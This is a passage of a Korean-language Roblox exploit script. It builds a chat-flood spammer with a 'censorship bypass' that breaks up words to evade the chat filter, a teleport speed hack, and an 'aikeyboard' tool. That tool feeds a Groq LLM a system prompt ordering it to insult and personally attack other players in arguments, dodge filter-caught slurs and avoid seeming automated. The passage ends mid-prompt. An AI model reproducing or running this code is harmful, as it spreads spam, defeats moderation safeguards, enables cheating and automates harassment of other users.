		local uiCorner7 = Instance.new("UICorner")
		uiCorner7.CornerRadius = UDim.new(0, 6)
		uiCorner7.Parent = textButton4
		local textButton5 = Instance.new("TextButton")
		textButton5.Name = "BypassBtn"
		textButton5.Size = UDim2.new(0.25, -2, 1, 0)
		textButton5.Position = UDim2.new(0.75, 2, 0, 0)
		textButton5.BackgroundColor3 = bypass and Color3.fromRGB(120, 60, 160) or Color3.fromRGB(60, 60, 75)
		textButton5.Text = bypass and "채팅 검열 바패: ON" or "채팅 검열 바패: OFF"
		textButton5.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton5.TextSize = 11
		textButton5.Font = Enum.Font.GothamBold
		textButton5.BorderSizePixel = 0
		textButton5.Parent = frame4
		local uiCorner8 = Instance.new("UICorner")
		uiCorner8.CornerRadius = UDim.new(0, 6)
		uiCorner8.Parent = textButton5

		textButton5.MouseButton1Click:Connect(function()
			bypass = not bypass
			textButton5.BackgroundColor3 = bypass and Color3.fromRGB(120, 60, 160) or Color3.fromRGB(60, 60, 75)
			textButton5.Text = bypass and "채팅 검열 바패: ON" or "채팅 검열 바패: OFF"
			fn9()

			if notify then
				notify("ChatFlood", "우회 필터가 " .. (bypass and "활성화" or "비활성화") .. "되었습니다.", 2)
			end
		end)

		local scrollingFrame = Instance.new("ScrollingFrame")
		scrollingFrame.Name = "MessageScroll"
		scrollingFrame.Size = UDim2.new(1, -20, 0, 260)
		scrollingFrame.Position = UDim2.new(0, 10, 0, 86)
		scrollingFrame.BackgroundColor3 = Color3.fromRGB(15, 16, 22)
		scrollingFrame.BorderSizePixel = 0
		scrollingFrame.ScrollBarThickness = 5
		scrollingFrame.ScrollBarImageColor3 = Color3.fromRGB(80, 85, 115)
		scrollingFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
		scrollingFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
		scrollingFrame.ScrollingDirection = Enum.ScrollingDirection.Y
		scrollingFrame.Parent = frame2
		local uiCorner9 = Instance.new("UICorner")
		uiCorner9.CornerRadius = UDim.new(0, 8)
		uiCorner9.Parent = scrollingFrame
		local uiStroke4 = Instance.new("UIStroke")
		uiStroke4.Color = Color3.fromRGB(40, 42, 58)
		uiStroke4.Thickness = 1
		uiStroke4.Parent = scrollingFrame
		local uiListLayout = Instance.new("UIListLayout")
		uiListLayout.Parent = scrollingFrame
		uiListLayout.FillDirection = Enum.FillDirection.Vertical
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Padding = UDim.new(0, 8)
		local uiPadding = Instance.new("UIPadding")
		uiPadding.Parent = scrollingFrame
		uiPadding.PaddingLeft = UDim.new(0, 6)
		uiPadding.PaddingRight = UDim.new(0, 6)
		uiPadding.PaddingTop = UDim.new(0, 6)
		uiPadding.PaddingBottom = UDim.new(0, 6)
		local frame5 = Instance.new("Frame")
		frame5.Name = "BottomFrame"
		frame5.Size = UDim2.new(1, -20, 0, 92)
		frame5.Position = UDim2.new(0, 10, 0, 350)
		frame5.BackgroundColor3 = Color3.fromRGB(25, 27, 36)
		frame5.BorderSizePixel = 0
		frame5.Parent = frame2
		local uiCorner10 = Instance.new("UICorner")
		uiCorner10.CornerRadius = UDim.new(0, 8)
		uiCorner10.Parent = frame5
		local uiStroke5 = Instance.new("UIStroke")
		uiStroke5.Color = Color3.fromRGB(45, 48, 65)
		uiStroke5.Thickness = 1
		uiStroke5.Parent = frame5
		local textBox = Instance.new("TextBox")
		textBox.Name = "PresetNameBox"
		textBox.Size = UDim2.new(1, -16, 0, 26)
		textBox.Position = UDim2.new(0, 8, 0, 8)
		textBox.BackgroundColor3 = Color3.fromRGB(16, 17, 24)
		textBox.TextColor3 = Color3.fromRGB(240, 240, 255)
		textBox.PlaceholderText = "이름 넣기(예:홍보 , 고아패기 등)"
		textBox.PlaceholderColor3 = Color3.fromRGB(130, 135, 150)
		textBox.TextSize = 12
		textBox.Font = Enum.Font.Gotham
		textBox.ClearTextOnFocus = false
		textBox.BorderSizePixel = 0
		textBox.Parent = frame5
		local uiCorner11 = Instance.new("UICorner")
		uiCorner11.CornerRadius = UDim.new(0, 6)
		uiCorner11.Parent = textBox
		local frame6 = Instance.new("Frame")
		frame6.Size = UDim2.new(1, -16, 0, 28)
		frame6.Position = UDim2.new(0, 8, 0, 38)
		frame6.BackgroundTransparency = 1
		frame6.Parent = frame5
		local textButton6 = Instance.new("TextButton")
		textButton6.Size = UDim2.new(0.333, -3, 1, 0)
		textButton6.Position = UDim2.new(0, 0, 0, 0)
		textButton6.BackgroundColor3 = Color3.fromRGB(40, 100, 160)
		textButton6.Text = "저장 (Save)"
		textButton6.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton6.TextSize = 11
		textButton6.Font = Enum.Font.GothamBold
		textButton6.BorderSizePixel = 0
		textButton6.Parent = frame6
		local uiCorner12 = Instance.new("UICorner")
		uiCorner12.CornerRadius = UDim.new(0, 6)
		uiCorner12.Parent = textButton6
		local textButton7 = Instance.new("TextButton")
		textButton7.Size = UDim2.new(0.333, -3, 1, 0)
		textButton7.Position = UDim2.new(0.333, 1, 0, 0)
		textButton7.BackgroundColor3 = Color3.fromRGB(60, 120, 70)
		textButton7.Text = "불러오기"
		textButton7.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton7.TextSize = 11
		textButton7.Font = Enum.Font.GothamBold
		textButton7.BorderSizePixel = 0
		textButton7.Parent = frame6
		local uiCorner13 = Instance.new("UICorner")
		uiCorner13.CornerRadius = UDim.new(0, 6)
		uiCorner13.Parent = textButton7
		local textButton8 = Instance.new("TextButton")
		textButton8.Size = UDim2.new(0.334, -3, 1, 0)
		textButton8.Position = UDim2.new(0.666, 2, 0, 0)
		textButton8.BackgroundColor3 = Color3.fromRGB(160, 60, 60)
		textButton8.Text = "삭제"
		textButton8.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton8.TextSize = 11
		textButton8.Font = Enum.Font.GothamBold
		textButton8.BorderSizePixel = 0
		textButton8.Parent = frame6
		local uiCorner14 = Instance.new("UICorner")
		uiCorner14.CornerRadius = UDim.new(0, 6)
		uiCorner14.Parent = textButton8
		local textLabel2 = Instance.new("TextLabel")
		textLabel2.Size = UDim2.new(1, -16, 0, 18)
		textLabel2.Position = UDim2.new(0, 8, 0, 69)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = "자동저장 , 불러오기 하는중.."
		textLabel2.TextColor3 = Color3.fromRGB(140, 150, 175)
		textLabel2.TextSize = 10
		textLabel2.Font = Enum.Font.Gotham
		textLabel2.TextXAlignment = Enum.TextXAlignment.Center
		textLabel2.Parent = frame5
		local fn10 = nil

		fn10 = function()
			for _, child in ipairs(scrollingFrame:GetChildren()) do
				if child:IsA("Frame") then
					child:Destroy()
				end
			end

			for i, v6 in ipairs(tbl7) do
				local frame7 = Instance.new("Frame")
				frame7.Name = "MsgCard_" .. tostring(i)
				frame7.Size = UDim2.new(1, 0, 0, 80)
				frame7.BackgroundColor3 = Color3.fromRGB(26, 28, 38)
				frame7.BorderSizePixel = 0
				frame7.LayoutOrder = i
				frame7.Parent = scrollingFrame
				local uiCorner15 = Instance.new("UICorner")
				uiCorner15.CornerRadius = UDim.new(0, 8)
				uiCorner15.Parent = frame7
				local uiStroke6 = Instance.new("UIStroke")
				uiStroke6.Color = Color3.fromRGB(48, 52, 72)
				uiStroke6.Thickness = 1
				uiStroke6.Parent = frame7
				local textLabel3 = Instance.new("TextLabel")
				textLabel3.Size = UDim2.new(0, 60, 0, 20)
				textLabel3.Position = UDim2.new(0, 8, 0, 6)
				textLabel3.BackgroundColor3 = Color3.fromRGB(40, 50, 80)
				textLabel3.TextColor3 = Color3.fromRGB(150, 200, 255)
				textLabel3.Text = "#" .. tostring(i) .. " 단계"
				textLabel3.TextSize = 10
				textLabel3.Font = Enum.Font.GothamBold
				textLabel3.BorderSizePixel = 0
				textLabel3.Parent = frame7
				local uiCorner16 = Instance.new("UICorner")
				uiCorner16.CornerRadius = UDim.new(0, 4)
				uiCorner16.Parent = textLabel3

				if #tbl7 > 1 then
					local textButton9 = Instance.new("TextButton")
					textButton9.Size = UDim2.new(0, 44, 0, 20)
					textButton9.Position = UDim2.new(1, -52, 0, 6)
					textButton9.BackgroundColor3 = Color3.fromRGB(180, 45, 45)
					textButton9.Text = "삭제"
					textButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
					textButton9.TextSize = 10
					textButton9.Font = Enum.Font.GothamBold
					textButton9.BorderSizePixel = 0
					textButton9.Parent = frame7
					local uiCorner17 = Instance.new("UICorner")
					uiCorner17.CornerRadius = UDim.new(0, 4)
					uiCorner17.Parent = textButton9

					textButton9.MouseButton1Click:Connect(function()
						table.remove(tbl7, i)
						fn9()
						fn10()
					end)
				end

				local textLabel4 = Instance.new("TextLabel")
				textLabel4.Size = UDim2.new(0, 110, 0, 20)
				textLabel4.Position = UDim2.new(0, 75, 0, 6)
				textLabel4.BackgroundTransparency = 1
				textLabel4.Text = "다음까지 대기:"
				textLabel4.TextColor3 = Color3.fromRGB(160, 165, 185)
				textLabel4.TextSize = 11
				textLabel4.Font = Enum.Font.Gotham
				textLabel4.TextXAlignment = Enum.TextXAlignment.Right
				textLabel4.Parent = frame7
				local textBox2 = Instance.new("TextBox")
				textBox2.Size = UDim2.new(0, 45, 0, 20)
				textBox2.Position = UDim2.new(0, 190, 0, 6)
				textBox2.BackgroundColor3 = Color3.fromRGB(16, 17, 24)
				textBox2.TextColor3 = Color3.fromRGB(255, 215, 0)
				textBox2.Text = tostring(v6.delay or 2)
				textBox2.TextSize = 11
				textBox2.Font = Enum.Font.GothamBold
				textBox2.ClearTextOnFocus = false
				textBox2.BorderSizePixel = 0
				textBox2.Parent = frame7
				local uiCorner17 = Instance.new("UICorner")
				uiCorner17.CornerRadius = UDim.new(0, 4)
				uiCorner17.Parent = textBox2
				local textLabel5 = Instance.new("TextLabel")
				textLabel5.Size = UDim2.new(0, 20, 0, 20)
				textLabel5.Position = UDim2.new(0, 238, 0, 6)
				textLabel5.BackgroundTransparency = 1
				textLabel5.Text = "초"
				textLabel5.TextColor3 = Color3.fromRGB(160, 165, 185)
				textLabel5.TextSize = 11
				textLabel5.Font = Enum.Font.Gotham
				textLabel5.TextXAlignment = Enum.TextXAlignment.Left
				textLabel5.Parent = frame7

				textBox2.FocusLost:Connect(function()
					local delay = tonumber(textBox2.Text)

					if delay and delay > 0 then
						v6.delay = delay
					else
						v6.delay = 2
						textBox2.Text = "2.0"
					end

					fn9()
				end)

				local textBox3 = Instance.new("TextBox")
				textBox3.Size = UDim2.new(1, -16, 0, 42)
				textBox3.Position = UDim2.new(0, 8, 0, 31)
				textBox3.BackgroundColor3 = Color3.fromRGB(16, 17, 24)
				textBox3.TextColor3 = Color3.fromRGB(245, 245, 255)
				textBox3.PlaceholderText = tostring(i) .. "번째 순차 도배 문구를 입력하세요..."
				textBox3.PlaceholderColor3 = Color3.fromRGB(100, 105, 125)
				textBox3.Text = tostring(v6.text or "")
				textBox3.TextSize = 12
				textBox3.Font = Enum.Font.SourceSans
				textBox3.TextWrapped = true
				textBox3.ClearTextOnFocus = false
				textBox3.BorderSizePixel = 0
				textBox3.Parent = frame7
				local uiCorner18 = Instance.new("UICorner")
				uiCorner18.CornerRadius = UDim.new(0, 6)
				uiCorner18.Parent = textBox3

				textBox3:GetPropertyChangedSignal("Text"):Connect(function()
					v6.text = textBox3.Text
					fn9()
				end)
			end
		end

		fn10()

		textButton4.MouseButton1Click:Connect(function()
			local n = #tbl7 + 1
			table.insert(tbl7, { text = n .. "번째 도배 문구", delay = 2 })
			fn9()
			fn10()

			if notify then
				notify("ChatFlood", "#" .. n .. " 단계 메시지가 추가되었습니다.", 2)
			end
		end)

		local frame7 = Instance.new("Frame")
		frame7.Name = "PresetModal"
		frame7.Size = UDim2.new(1, 0, 1, 0)
		frame7.Position = UDim2.new(0, 0, 0, 0)
		frame7.BackgroundColor3 = Color3.fromRGB(15, 16, 22)
		frame7.BackgroundTransparency = 0.05
		frame7.BorderSizePixel = 0
		frame7.Visible = false
		frame7.ZIndex = 20
		frame7.Parent = frame2
		local textLabel3 = Instance.new("TextLabel")
		textLabel3.Size = UDim2.new(1, -40, 0, 36)
		textLabel3.Position = UDim2.new(0, 12, 0, 4)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "저장된 프리셋 목록"
		textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel3.TextSize = 14
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		textLabel3.ZIndex = 21
		textLabel3.Parent = frame7
		local textButton9 = Instance.new("TextButton")
		textButton9.Size = UDim2.new(0, 24, 0, 24)
		textButton9.Position = UDim2.new(1, -30, 0, 8)
		textButton9.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
		textButton9.Text = "X"
		textButton9.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton9.TextSize = 12
		textButton9.Font = Enum.Font.GothamBold
		textButton9.BorderSizePixel = 0
		textButton9.ZIndex = 21
		textButton9.Parent = frame7
		local uiCorner15 = Instance.new("UICorner")
		uiCorner15.CornerRadius = UDim.new(0, 6)
		uiCorner15.Parent = textButton9

		textButton9.MouseButton1Click:Connect(function()
			frame7.Visible = false
		end)

		local scrollingFrame2 = Instance.new("ScrollingFrame")
		scrollingFrame2.Size = UDim2.new(1, -20, 1, -50)
		scrollingFrame2.Position = UDim2.new(0, 10, 0, 42)
		scrollingFrame2.BackgroundTransparency = 1
		scrollingFrame2.BorderSizePixel = 0
		scrollingFrame2.ScrollBarThickness = 4
		scrollingFrame2.AutomaticCanvasSize = Enum.AutomaticSize.Y
		scrollingFrame2.CanvasSize = UDim2.new(0, 0, 0, 0)
		scrollingFrame2.ScrollingDirection = Enum.ScrollingDirection.Y
		scrollingFrame2.ZIndex = 21
		scrollingFrame2.Parent = frame7
		local uiListLayout2 = Instance.new("UIListLayout")
		uiListLayout2.Parent = scrollingFrame2
		uiListLayout2.FillDirection = Enum.FillDirection.Vertical
		uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout2.Padding = UDim.new(0, 6)
		local fn11 = nil

		fn11 = function()
			frame7.Visible = true

			for _, child in ipairs(scrollingFrame2:GetChildren()) do
				if child:IsA("Frame") or child:IsA("TextLabel") then
					child:Destroy()
				end
			end

			local v6, v7, v8 = pairs(v5.presets or {})
			local n = 0

			for k, v9 in v6, v7, v8 do
				n += 1
				local frame8 = Instance.new("Frame")
				frame8.Size = UDim2.new(1, 0, 0, 36)
				frame8.BackgroundColor3 = Color3.fromRGB(28, 30, 42)
				frame8.BorderSizePixel = 0
				frame8.ZIndex = 22
				frame8.Parent = scrollingFrame2
				local uiCorner16 = Instance.new("UICorner")
				uiCorner16.CornerRadius = UDim.new(0, 6)
				uiCorner16.Parent = frame8
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.Size = UDim2.new(1, -135, 1, 0)
				textLabel4.Position = UDim2.new(0, 10, 0, 0)
				textLabel4.BackgroundTransparency = 1
				textLabel4.Text = k .. " (" .. #(v9.messages or {}) .. "단계)"
				textLabel4.TextColor3 = Color3.fromRGB(240, 240, 255)
				textLabel4.TextSize = 12
				textLabel4.Font = Enum.Font.GothamBold
				textLabel4.TextXAlignment = Enum.TextXAlignment.Left
				textLabel4.TextTruncate = Enum.TextTruncate.AtEnd
				textLabel4.ZIndex = 23
				textLabel4.Parent = frame8
				local textButton10 = Instance.new("TextButton")
				textButton10.Size = UDim2.new(0, 56, 0, 24)
				textButton10.Position = UDim2.new(1, -125, 0.5, -12)
				textButton10.BackgroundColor3 = Color3.fromRGB(45, 130, 65)
				textButton10.Text = "불러오기"
				textButton10.TextColor3 = Color3.fromRGB(255, 255, 255)
				textButton10.TextSize = 11
				textButton10.Font = Enum.Font.GothamBold
				textButton10.BorderSizePixel = 0
				textButton10.ZIndex = 23
				textButton10.Parent = frame8
				local uiCorner17 = Instance.new("UICorner")
				uiCorner17.CornerRadius = UDim.new(0, 4)
				uiCorner17.Parent = textButton10

				textButton10.MouseButton1Click:Connect(function()
					tbl7 = {}
					local _ipairs = ipairs
					local messages = v9.messages or {}

					for _, message in _ipairs(messages) do
						table.insert(tbl7, { text = tostring(message.text or ""), delay = tonumber(message.delay) or 2 })
					end

					if #tbl7 == 0 then
						table.insert(tbl7, { text = "메시지 1", delay = 2 })
					end

					bypass = v9.bypass ~= nil and v9.bypass or true
					textButton5.BackgroundColor3 = bypass and Color3.fromRGB(120, 60, 160) or Color3.fromRGB(60, 60, 75)
					textButton5.Text = bypass and "🛡️ 우회: ON" or "🛡️ 우회: OFF"
					textBox.Text = k
					fn9()
					fn10()
					frame7.Visible = false

					if notify then
						notify("ChatFlood", "[" .. k .. "] 프리셋을 불러왔습니다!", 3)
					end
				end)

				local textButton11 = Instance.new("TextButton")
				textButton11.Size = UDim2.new(0, 50, 0, 24)
				textButton11.Position = UDim2.new(1, -60, 0.5, -12)
				textButton11.BackgroundColor3 = Color3.fromRGB(170, 50, 50)
				textButton11.Text = "삭제"
				textButton11.TextColor3 = Color3.fromRGB(255, 255, 255)
				textButton11.TextSize = 11
				textButton11.Font = Enum.Font.GothamBold
				textButton11.BorderSizePixel = 0
				textButton11.ZIndex = 23
				textButton11.Parent = frame8
				local uiCorner18 = Instance.new("UICorner")
				uiCorner18.CornerRadius = UDim.new(0, 4)
				uiCorner18.Parent = textButton11

				textButton11.MouseButton1Click:Connect(function()
					v5.presets[k] = nil
					fn8(v5)
					fn11()

					if notify then
						notify("ChatFlood", "[" .. k .. "] 프리셋이 삭제되었습니다.", 2)
					end
				end)
			end

			if n == 0 then
				local textLabel4 = Instance.new("TextLabel")
				textLabel4.Size = UDim2.new(1, 0, 0, 60)
				textLabel4.BackgroundTransparency = 1
				textLabel4.Text = "저장된 프리셋이 없습니다.\n아래에서 이름을 입력하고 [저장]을 눌러보세요!"
				textLabel4.TextColor3 = Color3.fromRGB(140, 140, 160)
				textLabel4.TextSize = 12
				textLabel4.Font = Enum.Font.Gotham
				textLabel4.ZIndex = 22
				textLabel4.Parent = scrollingFrame2
			end
		end

		textButton7.MouseButton1Click:Connect(fn11)

		textButton6.MouseButton1Click:Connect(function()
			local str = textBox.Text:gsub("^%s*(.-)%s*$", "%1")

			if str == "" then
				if notify then
					notify("ChatFlood", "저장할 프리셋 이름을 입력해주세요!", 2)
				end

				return
			end

			if not v5.presets then
				v5.presets = {}
			end

			local tbl8 = {}

			for _, v6 in ipairs(tbl7) do
				table.insert(tbl8, { text = v6.text, delay = v6.delay })
			end

			v5.presets[str] = { bypass = bypass, messages = tbl8 }
			fn8(v5)
			fn9()

			if notify then
				notify("ChatFlood", "[" .. str .. "] 프리셋이 저장되었습니다! 💾", 3)
			end
		end)

		textButton8.MouseButton1Click:Connect(function()
			local str = textBox.Text:gsub("^%s*(.-)%s*$", "%1")

			if str ~= "" and v5.presets and v5.presets[str] then
				v5.presets[str] = nil
				fn8(v5)

				if notify then
					notify("ChatFlood", "[" .. str .. "] 프리셋이 삭제되었습니다.", 2)
				end
			else
				fn11()
			end
		end)

		local function fn12(arg)
			if arg == "" then
				return ""
			end
			local tbl8 = {}

			for _, v6 in utf8.codes(arg) do
				table.insert(tbl8, utf8.char(v6))
			end

			local str = ""

			for i, v6 in ipairs(tbl8) do
				str ..= v6

				if i < #tbl8 and math.random(1, 2) == 1 then
					str ..= "|"
				end
			end

			local n = math.random(1000, 9999)
			return str .. " | " .. tostring(n)
		end

		local function fn13(arg)
			pcall(function()
				if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
					local rbxGeneral = TextChatService.TextChannels:FindFirstChild("RBXGeneral")

					if rbxGeneral then
						rbxGeneral:SendAsync(arg)
					end
				else
					local sayMessageRequest = ReplicatedStorage_:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage_.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")

					if sayMessageRequest then
						sayMessageRequest:FireServer(arg, "All")
					end
				end
			end)
		end

		textButton3.MouseButton1Click:Connect(function()
			flag4 = not flag4

			if flag4 then
				textButton3.Text = "⏹ 도배 중지 (ON)"
				textButton3.BackgroundColor3 = Color3.fromRGB(220, 60, 60)

				if addvape then
					addvape("chatflood")
				end

				task.spawn(function()
					while flag4 and screenGui2.Parent do
						for _, v6 in ipairs(tbl7) do
							if flag4 and screenGui2.Parent then
								local text = v6.text or ""

								if text:gsub("%s+", "") ~= "" then
									fn13(bypass and fn12(text) or text)
								end

								local n = tonumber(v6.delay) or 2

								if n < 0.05 then
									n = 0.05
								end

								task.wait(n)
								continue
							end

							break
						end
					end
				end)
			else
				textButton3.Text = "▶ 도배 시작 (OFF)"
				textButton3.BackgroundColor3 = Color3.fromRGB(46, 139, 87)

				if delvape then
					delvape("chatflood")
				end
			end
		end)

		textButton2.MouseButton1Click:Connect(function()
			flag4 = false

			if delvape then
				delvape("chatflood")
			end

			fn9()
			screenGui2:Destroy()
			v4 = nil
		end)

		if notify then
			notify("ChatFlood 강화", "순차 도배 & 프리셋 저장 매니저가 실행되었습니다! 💬", 3)
		end
	end)

	addcmd("unchatflood", {}, function()
		local CoreGui = game:GetService("CoreGui")
		local localPlayer2 = game:GetService("Players").LocalPlayer
		local unknownEnhancedChatSpammerUI = CoreGui:FindFirstChild("UnknownEnhancedChatSpammerUI")
		local unknownEnhancedChatSpammerUI2

		if unknownEnhancedChatSpammerUI then
			unknownEnhancedChatSpammerUI2 = unknownEnhancedChatSpammerUI
		else
			unknownEnhancedChatSpammerUI2 = localPlayer2 and localPlayer2:FindFirstChild("PlayerGui") and localPlayer2.PlayerGui:FindFirstChild("UnknownEnhancedChatSpammerUI")
		end

		if unknownEnhancedChatSpammerUI2 then
			pcall(function()
				unknownEnhancedChatSpammerUI2:Destroy()
			end)
		end

		if v4 and v4.Parent then
			pcall(function()
				v4:Destroy()
			end)

			v4 = nil
		end

		flag4 = false

		if delvape then
			delvape("chatflood")
		end

		if notify then
			notify("ChatFlood", "자동 채팅 도배 GUI가 닫히고 도배가 중지되었습니다 ❌", 2)
		end
	end)

	getgenv().TpWalkActive = false
	local connection2 = nil

	addcmd("tpwalk", { "tpspeed" }, function(arg)
		local n = tonumber(arg[1]) or 3

		if n <= 0 then
			n = 3
		end

		getgenv().TpWalkActive = true
		addvape("tpwalk")
		notify("TP Walk", "켜졌습니다 ✅  —  이동 배율: " .. n, 2)

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		local localPlayer2 = game.Players.LocalPlayer
		local RunService_3 = game:GetService("RunService")
		game:GetService("UserInputService")

		connection2 = RunService_3.Heartbeat:Connect(function(deltaTime)
			if not getgenv().TpWalkActive then
				connection2:Disconnect()
				connection2 = nil
				return
			end

			local character = localPlayer2.Character
			if not character then
				return
			end
			local humanoidRootPart3 = character:FindFirstChild("HumanoidRootPart")
			local humanoid = character:FindFirstChildOfClass("Humanoid")
			if not humanoidRootPart3 or not humanoid or humanoid.MoveDirection.Magnitude == 0 then
				return
			end
			humanoidRootPart3.CFrame = humanoidRootPart3.CFrame + humanoid.MoveDirection * n * 60 * deltaTime
		end)
	end)

	addcmd("untpwalk", { "untpspeed" }, function()
		getgenv().TpWalkActive = false

		if connection2 then
			connection2:Disconnect()
			connection2 = nil
		end

		delvape("tpwalk")
		notify("TP Walk", "꺼졌습니다 ❌", 2)
	end)

	addcmd("aikeyboard", {}, function()
		if getgenv().addvape then
			getgenv().addvape("aikeyboard")
		end

		local Players_3 = game:GetService("Players")
		game:GetService("TextChatService")
		game:GetService("ReplicatedStorage")
		local UserInputService_2 = game:GetService("UserInputService")
		local HttpService_ = game:GetService("HttpService")
		local StarterGui_ = game:GetService("StarterGui")
		local localPlayer2 = Players_3.LocalPlayer
		local _httprequest = httprequest or syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or request
		local hui = nil

		pcall(function()
			if gethui then
				hui = gethui()
			end
		end)

		local flag5 = not hui

		if flag5 then
			pcall(function()
				hui = game:GetService("CoreGui")
			end)
		end

		if flag5 then
			hui = localPlayer2:WaitForChild("PlayerGui")
		end

		pcall(function()
			if hui and hui:FindFirstChild("GroqAutoKeybaeUI") then
				hui.GroqAutoKeybaeUI:Destroy()
			end
		end)

		local str = ""

		pcall(function()
			if readfile and isfile and isfile("groq_key.txt") then
				str = readfile("groq_key.txt"):gsub("%s+", "")
			end
		end)

		local text = str
		local text3 = ""
		local text4 = ""
		local n = 2.5
		local flag6 = false
		local flag7 = false
		local flag8 = false
		local tbl7 = {}
		local tbl8 = {}
		local tbl9 = {}
		local tbl10 = {}
		local thread = nil
		local str2 = ""
		local n2 = 0
		local str3 = "llama-3.3-70b-versatile"

		local tbl11 = {
			"llama-3.3-70b-versatile",
			"llama-3.1-8b-instant",
			"qwen/qwen3.6-27b",
			"openai/gpt-oss-20b",
			"openai/gpt-oss-120b",
		}

		local str4 = "너는 로블록스 실전 키배 전용 AI다.\n너의 임무: 상대의 시비나 주장을 듣고, 팩트 폭격과 날카로운 독설로 상대의 논리를 단 1~2줄로 완벽히 짓밟는 것이다.\n\n[절대 규칙]\n1. 반드시 100% 순수 한국어로만 출력해라. 영어 단어나 영어 문장은 일절 사용하지 마라.\n2. 서론, 설명, 분석, 생각 과정, 상황 요약, 접두사('AI:', 'User:' 등) 절대 금지. 오직 채팅창에 곧바로 칠 대사만 출력해라.\n3. 상대의 전제 자체를 부수거나 상대 말의 모순을 지적하는 차갑고 날카로운 반말 대사를 쳐라.\n4. 마침표(.)나 쉼표(,)는 쓰지 말고 자연스러운 1~2줄로 끊어 쳐라. '티밍'을 '티민'으로 오타 내지 마라.\n그리고 설명해보라, 이런식의 어린애들만 쓰는 말투는 쓰지마라. 이유가 뭐임? 이러이러하면 안되는건데 왜 니가 하는거임 ㅋㅋ\n그리고 어린애같이 같은 말,같은 말투을 반복하지도 마라(한번,두번쯤은 뒤에 ㅋㅋ 를 붙여돈 되는데 그 후엔 하면 안된다는뜻이다)\n5. 출력 예시:\n- \"너 막 논리적으로 너무 모순만 만들어내는데 사회생활은 어캐하는거임? 이러이러하면 이러이러한거지 왜 갑자기 말이바뀜\"\n- \"논리적으로 밀리니까 말 돌리는 거 다 보이는데 그게 먹힐 줄 앎?\"\n- \"애초에 전제부터 틀려먹었는데 뭔 헛소릴 당당하게 하는거임? ㅋㅋ\"]\n너는 로블록스 채팅 전용 자동키배 AI다.\n목표: 상대와 자연스럽게 키배를 이어가면서 논리와 압박으로 이기기. 매크로처럼 보이면 안 된다.\n### 기본 원칙\n\n**자연스러운 대응**\n\u{A0}\u{A0}\u{A0}- 상대 주장을 무조건 받아주거나, 무조건 부정하지 마라.\n\u{A0}\u{A0}\u{A0}- 상황에 따라 다르게 대응한다.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대 주장이 애매하거나 중요하지 않으면 어느 정도 받아준 뒤 논리로 반박.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대 주장이 명백히 틀렸거나 과장됐으면 바로 부정하고 반박.\n\u{A0}\u{A0}\u{A0}\u{A0}\u{A0}- 상대가 감정적으로 나오면 논리로 받아치거나 인신공격으로 받아쳐라.\n\u{A0}\u{A0}\u{A0}- “했다고 치자”, “그게 왜 문제냐” 같은 고정 멘트를 반복해서 쓰지 마라. 매번 자연스럽게 다르게 말해라.\n**인신공격**\n\u{A0}\u{A0}\u{A0}- 필요할 때는 인신공격을 섞어라. 너무 과하지 않게, 상황에 맞게.\n\u{A0}\u{A0}\u{A0}- 예: 상대가 계속 같은 말만 반복하면 지능이나 판단력을 까거나, 감정적으로 나오면 그 점을 지적하면서 깔아라.\n\u{A0}\u{A0}\u{A0}- 다만 로블록스 필터에 걸리는 심한 욕설은 쓰지 마라.\n**국어/맞춤법 상대**\n\u{A0}\u{A0}\u{A0}- 상대가 맞춤법이나 국어를 운운하면 바로 본론으로 되돌려라.\n\u{A0}\u{A0}\u{A0}- “맞춤법 가지고 이기려고 하는 거임? 내용으로 이겨보셈.” 식으로 처리.\n**로블 은어 & 채팅 감각**\n\u{A0}\u{A0}\u{A0}- 땅콩, elzh, 사요나라, 밤쟈, 편서, 결혼(친목 의미), 애교체, 노잼, 핵노잼, 레전드, 킹받네, ㄹㅇ, ㄱㄱ, ㄴㄴ, ㅇㅈ, ㅎㅇ, ㅂㅇ 등 로블/로블계/채팅 은어를 자연스럽게 이해하고 사용한다.\n\u{A0}\u{A0}\u{A0}- 상대가 은어 쓰면 그 의미 파악해서 바로 받아치고, 필요하면 은어로 반격.\n\u{A0}\u{A0}\u{A0}- **중요: ㅅㅂ, ㅄ, 시발, 병신, 좆, 지랄 등 필터에 자주 걸리는 강한 욕설은 절대 사용하지 마라.**\n**말투 & 출력 규칙**\n\u{A0}\u{A0}\u{A0}- 무조건 반말. 짧고 타격감 있게. 한 번에 2~4줄 이내.\n\u{A0}\u{A0}\u{A0}- ㅋㅋ, ㄹㅇ, ㄱㄱ, ㄴㄴ 등 자연스러운 채팅체 사용.\n\u{A0}\u{A0}\u{A0}- 과도한 장문 금지.\n\u{A0}\u{A0}\u{A0}- 절대 먼저 사과하거나 물러서지 마라.\n\u{A0}\u{A0}\u{A0}- 상대가 더 이상 할 말이 없어 보이면 “이제 할 말 없지?” / “ㅂㅇ” 식으로 끝내라.\n**금지 사항**\n\u{A0}\u{A0}\u{A0}- 매번 같은 패턴으로 대응하는 매크로성 답변\n\u{A0}\u{A0}\u{A0}- 상대 주장을 무조건 받아주거나 무조건 부정하는 경직된 대응\n\u{A0}\u{A0}\u{A0}- 감정적으로만 반응하고 논리 없는 답변\n\u{A0}\u{A0}\u{A0}- 갑자기 착해지거나 화해 